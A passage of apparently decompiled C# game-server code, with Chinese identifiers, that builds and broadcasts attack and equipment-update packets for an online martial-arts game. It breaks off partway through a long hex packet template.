						发包类.Write4(0);
						发包类.Write4(0);
					}
					if (Play.Player_Job != 4 && Play.Player_Job != 11)
					{
						发包类.Write2(0);
					}
					else if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[73];
						}
						发包类.Write2(999);
					}
					else
					{
						发包类.Write2(0);
					}
					发包类.Write2(0);
					发包类 发包类2 = new 发包类();
					发包类 发包类3 = new 发包类();
					发包类 发包类4 = new 发包类();
					发包类 发包类5 = new 发包类();
					发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write2(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(1);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write2(0);
						发包类3.Write4(0);
						发包类4.Write4(0);
						发包类6.Write4(0);
					}
					for (int k = 0; k < 100 - 群攻击.Count; k++)
					{
						发包类5.Write(0);
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类.Write4(宠物攻击力);
						}
						else
						{
							发包类.Write4(0);
						}
					}
					else
					{
						发包类.Write4(宠物攻击力);
					}
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(1);
					发包类.ToArray3();
					if (Play.Client != null)
					{
						Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
					}
					发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送群攻攻击数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public int 判断拳师连击(int 武功ID)
		{
			if (武功ID != 3000101 && 武功ID != 3000105)
			{
				拳师连击控制 = 0;
				return 0;
			}
			if (拳师连击控制 == 0)
			{
				拳师连击控制 = 1;
				return 武功ID;
			}
			if (拳师连击控制 == 1)
			{
				拳师连击控制 = 2;
				return 武功ID + 1;
			}
			if (拳师连击控制 == 2)
			{
				拳师连击控制 = 3;
				return 武功ID + 2;
			}
			if (拳师连击控制 == 3)
			{
				拳师连击控制 = 4;
				return 武功ID + 3;
			}
			if (拳师连击控制 == 4)
			{
				拳师连击控制 = 5;
				return 3000109;
			}
			拳师连击控制 = 1;
			return 武功ID;
		}

		public void 发送攻击人物数据(Players Play, int 攻击对象人物全服ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量, int 障力吸收, int 宠物攻击力)
		{
			try
			{
				Random random = new Random(World.GetRandomSeed());
				武功类 value;
				if (World.TBL_KONGFU.TryGetValue(武功ID, out value))
				{
					if ((Play.Player_Job == 4 || Play.Player_Job == 11) && BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						if (攻击对象人物全服ID < 10000 && value.FLD_武功类型 != 1 && 武功ID != 4000101 && 武功ID != 4000401 && 武功ID != 4000501 && 武功ID != 4000601 && 武功ID != 4000701 && 武功ID != 4000801 && 武功ID != 4000901 && 武功ID != 4002101 && 武功ID != 4002201 && 武功ID != 4002301 && 武功ID != 4002401)
						{
							num = ((num >= 1) ? (num - 1) : 0);
						}
						if (num <= 0)
						{
							num = 0;
						}
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num <= 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(攻击对象人物全服ID);
						发包类.Write2(1);
						if (Play.Player_Job != 4 && Play.Player_Job != 11)
						{
							if (武功ID == 3000401)
							{
								发包类.Write2(0);
							}
							else if (value.FLD_武功类型 == 1 && Play.人物全服ID == 攻击对象人物全服ID)
							{
								发包类.Write2(0);
							}
							else
							{
								发包类.Write2(武功ID);
							}
						}
						else
						{
							发包类.Write2(BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0));
						}
						发包类.Write2(武功ID);
						if (武功ID == 3000401)
						{
							发包类.Write4(0);
						}
						else
						{
							发包类.Write4(攻击力);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(障力吸收);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(武功ID);
						if (Play.Player_Job == 4 && value.FLD_TYPE == 4 && base.弓群攻触发心神)
						{
							发包类.Write4(136);
							base.弓群攻触发心神 = false;
						}
						else
						{
							发包类.Write4(value.FLD_EFFERT);
						}
						发包类.Write(Play.人物坐标_X);
						发包类.Write(15f);
						发包类.Write(Play.人物坐标_Y);
						if (武功ID == 3000401)
						{
							if (攻击对象人物全服ID > 10000)
							{
								发包类.Write(4);
							}
							else
							{
								发包类.Write(0);
							}
						}
						else
						{
							发包类.Write(value.FLD_武功类型);
						}
						if (武功ID == 3000401)
						{
							if (攻击对象人物全服ID > 10000)
							{
								发包类.Write(1);
							}
							else
							{
								发包类.Write(0);
							}
						}
						else
						{
							发包类.Write(1);
						}
						发包类.Write2(0);
						发包类.Write4(最后血量);
						if (武功ID == 3000401)
						{
							发包类.Write4(0);
						}
						else if (攻击力 < 1)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						if (攻击对象人物全服ID > 10000)
						{
							if (宠物攻击力 != -1)
							{
								if (random.Next(0, 100) < 80)
								{
									发包类.Write4(宠物攻击力);
								}
								else
								{
									发包类.Write4(0);
								}
							}
							else
							{
								发包类.Write4(宠物攻击力);
							}
						}
						else
						{
							发包类.Write4(-1);
						}
						if (base.Player_Job == 9)
						{
							if (攻击力 >= 1 && value.FLD_武功类型 != 2)
							{
								double num2 = RNG.Next(0, 120);
								if (攻击对象人物全服ID > 10000)
								{
									if (num2 <= base.谭_连环飞舞)
									{
										发包类.Write4(1);
										显示大字(base.人物全服ID, 272);
									}
									else
									{
										发包类.Write4(0);
									}
								}
								else if (base.谭_纵横无双 > 0.0)
								{
									if (num2 <= base.谭_连环飞舞 + base.谭_纵横无双)
									{
										显示大字(base.人物全服ID, 272);
										int num3 = RNG.Next(2, 6);
										if (num3 > 2)
										{
											发包类.Write4(3);
										}
										else
										{
											发包类.Write4(num3);
										}
									}
									else
									{
										发包类.Write4(0);
									}
								}
								else
								{
									发包类.Write4(0);
								}
							}
							else
							{
								发包类.Write4(0);
							}
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						if (武功ID == 3000401)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(拳师连击控制);
						}
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类, 2560, Play.人物全服ID);
						}
						发送当前范围广播数据(发包类, 2560, Play.人物全服ID);
					}
				}
				else
				{
					int value2 = 1;
					int num4 = 攻击力;
					int num5 = 0;
					int num6 = 0;
					int num7 = 0;
					int value3 = 0;
					switch (攻击类型)
					{
					default:
						if (Play.Player_Job == 6)
						{
							num4 = 0;
							num5 = 0;
							if (攻击力 != 0)
							{
								num4 = new Random().Next(攻击力 / 2 - 10, 攻击力 / 2 + 10);
								num5 = 攻击力 - num4;
							}
							value2 = 2;
						}
						break;
					case 130:
					case 131:
					case 132:
					case 133:
						if (攻击力 != 0)
						{
							Random random4 = new Random();
							num4 = random4.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
							num5 = random4.Next((攻击力 - num4) / 4 - 10, (攻击力 - num4) / 4 + 10);
							num6 = random4.Next((攻击力 - num4 - num5) / 3 - 10, (攻击力 - num4 - num5) / 3 + 10);
							num7 = random4.Next((攻击力 - num4 - num5 - num6) / 2 - 10, (攻击力 - num4 - num5 - num6) / 2 + 10);
							value3 = 攻击力 - num4 - num5 - num6 - num7;
							value2 = 5;
						}
						break;
					case 128:
					case 129:
						if (Play.Player_Job == 6)
						{
							if (攻击力 != 0)
							{
								Random random2 = new Random();
								num4 = random2.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
								num5 = random2.Next((攻击力 - num4) / 4 - 10, (攻击力 - num4) / 4 + 10);
								num6 = random2.Next((攻击力 - num4 - num5) / 3 - 10, (攻击力 - num4 - num5) / 3 + 10);
								num7 = random2.Next((攻击力 - num4 - num5 - num6) / 2 - 10, (攻击力 - num4 - num5 - num6) / 2 + 10);
								value3 = 攻击力 - num4 - num5 - num6 - num7;
								value2 = 5;
							}
						}
						else
						{
							Random random3 = new Random();
							num4 = random3.Next(攻击力 / 3 - 10, 攻击力 / 3 + 10);
							num5 = random3.Next((攻击力 - num4) / 2 - 10, (攻击力 - num4) / 2 + 10);
							num6 = 攻击力 - num4 - num5;
							value2 = 3;
						}
						break;
					}
					if ((Play.Player_Job == 4 || Play.Player_Job == 11) && BitConverter.ToInt32(Play.装备栏已穿装备[3].物品ID, 0) != 0 && BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num8 = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						if (攻击对象人物全服ID < 10000)
						{
							num8 = ((num8 >= 10) ? (num8 - 10) : 0);
						}
						if (num8 <= 0)
						{
							num8 = 0;
						}
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num8);
						if (num8 <= 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
					using (发包类 发包类2 = new 发包类())
					{
						int value4 = 1000;
						发包类2.Write2(攻击对象人物全服ID);
						发包类2.Write2(1);
						if (Play.Player_Job != 4 && Play.Player_Job != 11)
						{
							发包类2.Write2(武功ID);
						}
						else
						{
							发包类2.Write2(BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0));
						}
						switch (攻击类型)
						{
						case 126:
							value4 = ((base.Player_Job == 3) ? 850 : ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job == 5) ? 850 : ((base.Player_Job != 6) ? 700 : 450))));
							break;
						case 127:
							value4 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job == 5) ? 1100 : ((base.Player_Job == 6) ? 450 : ((base.Player_Job != 10) ? 800 : 700))));
							break;
						case 128:
							value4 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : 650);
							break;
						case 129:
							value4 = ((base.Player_Job == 3) ? 850 : ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job != 6) ? 600 : 600)));
							break;
						case 130:
							value4 = 650;
							break;
						case 131:
							value4 = ((base.Player_Job != 6) ? 700 : 600);
							break;
						case 132:
							value4 = ((base.Player_Job != 6) ? 700 : 450);
							break;
						case 133:
							value4 = ((base.Player_Job != 6) ? 600 : 450);
							break;
						case 134:
							value4 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1700 : ((base.Player_Job != 6) ? 1150 : 850));
							break;
						case 136:
							value4 = 1000;
							break;
						case 113:
							value4 = 500;
							break;
						case 112:
							value4 = 500;
							break;
						}
						发包类2.Write2(value4);
						发包类2.Write4(num4);
						发包类2.Write4(num5);
						发包类2.Write4(num6);
						发包类2.Write4(num7);
						发包类2.Write4(value3);
						发包类2.Write4(障力吸收);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(武功ID);
						发包类2.Write4(攻击类型);
						发包类2.Write(Play.人物坐标_X);
						发包类2.Write(15f);
						发包类2.Write(Play.人物坐标_Y);
						发包类2.Write(0);
						发包类2.Write(value2);
						发包类2.Write2(0);
						发包类2.Write4(最后血量);
						if (攻击力 == 0)
						{
							发包类2.Write4(1);
						}
						else
						{
							发包类2.Write4(0);
						}
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						if (攻击对象人物全服ID > 10000)
						{
							if (宠物攻击力 != -1)
							{
								if (random.Next(0, 100) < 80)
								{
									发包类2.Write4(宠物攻击力);
								}
								else
								{
									发包类2.Write4(0);
								}
							}
							else
							{
								发包类2.Write4(宠物攻击力);
							}
						}
						else
						{
							发包类2.Write4(-1);
						}
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类2, 2560, Play.人物全服ID);
						}
						发送当前范围广播数据(发包类2, 2560, Play.人物全服ID);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送攻击人物数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送灵兽攻击人物数据(Players Play, int 攻击对象人物全服ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量)
		{
			try
			{
				武功类 value;
				if (World.TBL_KONGFU.TryGetValue(武功ID, out value))
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(攻击对象人物全服ID);
						发包类.Write2(1);
						发包类.Write2(武功ID);
						发包类.Write2(0);
						发包类.Write4(攻击力);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(武功ID);
						发包类.Write4(value.FLD_EFFERT);
						发包类.Write(Play.人物灵兽.人物坐标_X);
						发包类.Write(15f);
						发包类.Write(Play.人物灵兽.人物坐标_Y);
						发包类.Write(0);
						发包类.Write(1);
						发包类.Write2(0);
						发包类.Write4(最后血量);
						if (攻击力 < 1)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(-1);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类, 2560, Play.人物灵兽全服ID);
						}
						发送当前范围广播数据(发包类, 2560, Play.人物灵兽全服ID);
					}
				}
				else
				{
					int value2 = 1;
					int num = 攻击力;
					int num2 = 0;
					int num3 = 0;
					int num4 = 0;
					int value3 = 0;
					switch (攻击类型)
					{
					default:
						if (Play.Player_Job == 6)
						{
							num = 0;
							num2 = 0;
							if (攻击力 != 0)
							{
								num = new Random().Next(攻击力 / 2 - 10, 攻击力 / 2 + 10);
								num2 = 攻击力 - num;
							}
							value2 = 2;
						}
						break;
					case 130:
					case 131:
					case 132:
					case 133:
						if (攻击力 != 0)
						{
							Random random3 = new Random();
							num = random3.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
							num2 = random3.Next((攻击力 - num) / 4 - 10, (攻击力 - num) / 4 + 10);
							num3 = random3.Next((攻击力 - num - num2) / 3 - 10, (攻击力 - num - num2) / 3 + 10);
							num4 = random3.Next((攻击力 - num - num2 - num3) / 2 - 10, (攻击力 - num - num2 - num3) / 2 + 10);
							value3 = 攻击力 - num - num2 - num3 - num4;
							value2 = 5;
						}
						break;
					case 128:
					case 129:
						if (Play.Player_Job == 6)
						{
							if (攻击力 != 0)
							{
								Random random = new Random();
								num = random.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
								num2 = random.Next((攻击力 - num) / 4 - 10, (攻击力 - num) / 4 + 10);
								num3 = random.Next((攻击力 - num - num2) / 3 - 10, (攻击力 - num - num2) / 3 + 10);
								num4 = random.Next((攻击力 - num - num2 - num3) / 2 - 10, (攻击力 - num - num2 - num3) / 2 + 10);
								value3 = 攻击力 - num - num2 - num3 - num4;
								value2 = 5;
							}
						}
						else
						{
							Random random2 = new Random();
							num = random2.Next(攻击力 / 3 - 10, 攻击力 / 3 + 10);
							num2 = random2.Next((攻击力 - num) / 2 - 10, (攻击力 - num) / 2 + 10);
							num3 = 攻击力 - num - num2;
							value2 = 3;
						}
						break;
					}
					using (发包类 发包类2 = new 发包类())
					{
						发包类2.Write2(攻击对象人物全服ID);
						发包类2.Write2(1);
						发包类2.Write4(0);
						发包类2.Write4(num);
						发包类2.Write4(num2);
						发包类2.Write4(num3);
						发包类2.Write4(num4);
						发包类2.Write4(value3);
						发包类2.Write4(武功ID);
						发包类2.Write4(攻击类型);
						发包类2.Write(Play.人物灵兽.人物坐标_X);
						发包类2.Write(15f);
						发包类2.Write(Play.人物灵兽.人物坐标_Y);
						发包类2.Write(0);
						发包类2.Write(value2);
						发包类2.Write2(0);
						发包类2.Write4(最后血量);
						if (攻击力 == 0)
						{
							发包类2.Write4(1);
						}
						else
						{
							发包类2.Write4(0);
						}
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(uint.MaxValue);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						发包类2.Write4(0);
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类2, 2560, Play.人物灵兽全服ID);
						}
						发送当前范围广播数据(发包类2, 2560, Play.人物灵兽全服ID);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送攻击人物数据      出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 更新装备效果()
		{
			byte[] array = Converter.hexStringToByte("AA55060CB4047600000C00000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			for (int i = 0; i < 31; i++)
			{
				if (i >= 16)
				{
					if (i == 30)
					{
						if (装备栏已穿装备[15].FLD_MAGIC1 == 220000001)
						{
							装备栏已穿装备[15].FLD_MAGIC2 = 1;
						}
						else if (装备栏已穿装备[15].FLD_MAGIC1 == 220000002)
						{
							装备栏已穿装备[15].FLD_MAGIC2 = 2;
						}
						if (装备栏已穿装备[15].FLD_MAGIC1 == 220000003)
						{
							装备栏已穿装备[15].FLD_MAGIC2 = 3;
						}
						System.Buffer.BlockCopy(装备栏已穿装备[15].物品_byte, 0, array, 10 + i * World.发包单个物品大小, World.数据库单个物品大小);
					}
					else
					{
						System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
					}
				}
				else if (i == 15)
				{
					System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
				else if (base.人物坐标_地图 == 801 && i == 11)
				{
					byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					byte[] array2 = new byte[12];
					byte[] array3 = new byte[64];
					System.Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 0, array2, 0, 12);
					byte[] dst = array2;
					System.Buffer.BlockCopy(bytes, 0, dst, 0, 8);
					System.Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 12, array3, 0, 64);
					if (base.势力战派别 == "仙族")
					{
						if (base.Player_Sex == 1)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(16900001), 0, array2, 8, 4);
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(26900075), 0, array2, 8, 4);
						}
					}
					else if (base.Player_Sex == 1)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(16900672), 0, array2, 8, 4);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(26900672), 0, array2, 8, 4);
					}
					System.Buffer.BlockCopy(array2, 0, array, 10 + i * World.发包单个物品大小, 12);
					System.Buffer.BlockCopy(array3, 0, array, 26 + i * World.发包单个物品大小, 64);
				}
				else if ((base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201) && i == 3)
				{
					System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
				else
				{
					if (装备栏已穿装备[i].Get物品ID == 0L)
					{
						continue;
					}
					byte[] @byte = 装备栏已穿装备[i].GetByte();
					int num = (int)装备栏已穿装备[i].Get物品ID;
					if (i == 11)
					{
						if (装备栏已穿装备[i].FLD_SERIES == 1)
						{
							num = int.Parse(num.ToString().Remove(7) + "0");
							for (int j = 0; j < 7; j++)
							{
								ItmeClass value;
								if (!World.Itme.TryGetValue(num, out value) || value.FLD_SERIES != 2)
								{
									num++;
									continue;
								}
								num = value.FLD_PID;
								break;
							}
							if (num >= 16900830 && num <= 16900836)
							{
								num = 16900832;
							}
						}
					}
					else if (装备栏已穿装备[i].FLD_Intrgration == 1)
					{
						num -= 5000;
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(num), 0, @byte, 8, 4);
					System.Buffer.BlockCopy(@byte, 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public void 更新装备效果to(Players toPlay, Players thisPlay)
		{
			byte[] array = Converter.hexStringToByte("AA55060CB4047600000C00000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000